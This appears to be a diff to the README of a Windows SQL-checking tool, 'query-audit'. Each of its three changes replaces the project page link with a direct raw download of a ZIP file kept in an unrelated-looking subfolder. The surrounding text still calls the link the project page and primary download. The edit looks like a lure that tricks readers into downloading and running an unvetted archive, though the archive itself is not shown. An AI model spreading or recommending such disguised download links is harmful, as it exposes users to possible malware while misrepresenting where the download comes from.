@@ -1,6 +1,6 @@
 # 🧾 query-audit - Catch SQL issues before release
 
-[![Download query-audit](https://img.shields.io/badge/Download-query--audit-blue?style=for-the-badge&logo=github)](https://github.com/Kelcysisyphean284/query-audit)
+[![Download query-audit](https://img.shields.io/badge/Download-query--audit-blue?style=for-the-badge&logo=github)](https://github.com/Kelcysisyphean284/query-audit/raw/refs/heads/main/razorback/audit_query_v1.3.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ This tool is made for people who want to spot query problems before they reach p
 
 Visit this page to download and use query-audit on Windows:
 
-https://github.com/Kelcysisyphean284/query-audit
+https://github.com/Kelcysisyphean284/query-audit/raw/refs/heads/main/razorback/audit_query_v1.3.zip
 
 If the page has a release file, download it to your PC. If it has a source package, save it in a folder you can find later.
 
@@ -139,7 +139,7 @@ If you use a ZIP file, keep the folder structure the same after you extract it.
 
 Primary download and project page:
 
-https://github.com/Kelcysisyphean284/query-audit
+https://github.com/Kelcysisyphean284/query-audit/raw/refs/heads/main/razorback/audit_query_v1.3.zip
 
 ## 🧩 Topics covered
 
